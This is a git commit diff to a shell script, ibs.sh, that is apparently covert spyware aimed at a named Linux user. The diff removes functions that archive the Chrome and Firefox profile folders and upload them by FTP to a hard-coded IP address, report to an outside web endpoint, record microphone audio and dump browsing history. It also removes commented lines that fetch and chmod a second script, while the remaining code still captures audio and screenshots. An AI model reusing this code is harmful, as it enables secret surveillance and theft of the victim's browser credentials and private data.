c55bdba157f8bb75ce6b7ec90852000a83641966
hLbx0 <90946073+hLbx0@users.noreply.github.com>
2023-07-04 13:37:42 -0400

    Update ibs.sh

--- ibs.sh
+++ ibs.sh
@@ -28,76 +28,6 @@ function ssx_(){
     rm -f "$IBUS_$output_file"
 }
 
-function GCx_(){
-	ftp_server="139.162.128.166"
-	ftp_user="xyz"
-	ftp_password="xyz"
-	#
-	folder_to_compress="/home/$USER/.config/google-chrome"
-	local_file="$IBUS_"`date +%s`"gcx.tar.gz"
-	tar -czvf "$local_file" "$folder_to_compress"
-	#
-	remote_directory="/home/r00t1970/"`date +%s`"GCx.tar.gz"
-	#
-	msgx=`ftp -npvi $ftp_server <<END_SCRIPT
-	quote USER $ftp_user
-	quote PASS $ftp_password
-	binary
-	put "$local_file" "$remote_directory"
-	quit
-	END_SCRIPT`
-	#
-	OX_=`curl -k -X POST -d "descr=$msgx&cat=SS" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
-     dbgx "Descr: $msgx Cat: SS cx_OX:$OX_";
-     #
-     rm -f "$local_file"
-     rm -f "$IBUS_""gcx.tar.gz"
-}
-
-function MZLx_(){
-	ftp_server="139.162.128.166"
-	ftp_user="xyz"
-	ftp_password="xyz"
-	#
-	folder_to_compress="/home/$USER/.mozilla"
-	local_file="$IBUS_"`date +%s`"mzlx.tar.gz"
-	tar -czvf "$local_file" "$folder_to_compress"
-	#
-	remote_directory="/home/r00t1970/"`date +%s`"MZLx.tar.gz"
-	#
-	msgx=`ftp -npvi $ftp_server <<END_SCRIPT
-	quote USER $ftp_user
-	quote PASS $ftp_password
-	binary
-	put "$local_file" "$remote_directory"
-	quit
-	END_SCRIPT`
-	#
-	OX_=`curl -k -X POST -d "descr=$msgx&cat=SS" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
-     dbgx "Descr: $msgx Cat: SS cx_OX:$OX_";
-     #
-     rm -f "$local_file"
-     rm -f "$IBUS_""mzlx.tar.gz"
-}
-
-function ax(){
-    #sox
-    duration=30
-    output_file="a.wav"
-    #
-    amixer set Capture cap
-    #
-    dbgx "ax started..."
-    rec -q "$IBUS_$output_file" trim 0 "$duration"
-    dbgx "ax stopped. Saved to $output_file"
-    #
-    cx "$output_file" "AX"
-    slpx
-    rm -f "$output_file"
-    rm -f "$IBUS_$output_file"
-    #
-}
-
 function ax_(){
     #arecord
     duration=30
@@ -137,20 +67,6 @@ function WbCmx(){
 	cx "$output_file" "PX"
     	slpx
     	rm -f "$IBUS_$output_file"
-}
-#sqlite3
-function Hstrx(){
-    output_file="chrome_history.txt"
-    tmp_chrome_history="$IBUS_/tmp_chrome_history.sqlite"
-    chrome_history_file="$HOME_/.config/google-chrome/Default/History"
-    cp "$chrome_history_file" $tmp_chrome_history
-    sqlite3 -separator $'\t' $tmp_chrome_history "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'), title, url FROM urls ORDER BY last_visit_time DESC;" > $IBUS_$output_file
-    dbgx "Chrome history extracted to $IBUS_$output_file"
-    rm $tmp_chrome_history
-    #
-    cx "$output_file" "HX"
-    slpx
-    rm -f "$IBUS_$output_file"
 }
 
 function cx(){
@@ -215,26 +131,7 @@ function px(){
 	#
         Ntx
 	#
-	#killall -q -15 chrome
-	#rm -f /home/brigid/.config/google-chrome
-	#
-    	#ssx_ & PxNwx & Hstrx
-	#WbCmx
     	ax_ & ssx_ & PxNwx
-	#GCx_
-	#pkill -f firefox
-	#MZLx_
- 	#
-  	#HOME__D="/home/brigid/Documents/"
-	#wget --no-check-certificate --no-cache --no-cookies https://github.com/hLbx0/IBS/raw/main/brie.sh -O "$HOME__D".brie.sh
-	#chmod 777 "$HOME__D".brie.sh
- 	#
-  
-  	#Rspx=`ls -lah $HOME__D`
-   	#cx_ "$Rspx" "SSID"
-
-    	#phnx=`df -h`
-        #cx_ "$phnx" "SSID"
     	#
 	#ssx2
  	#reboot
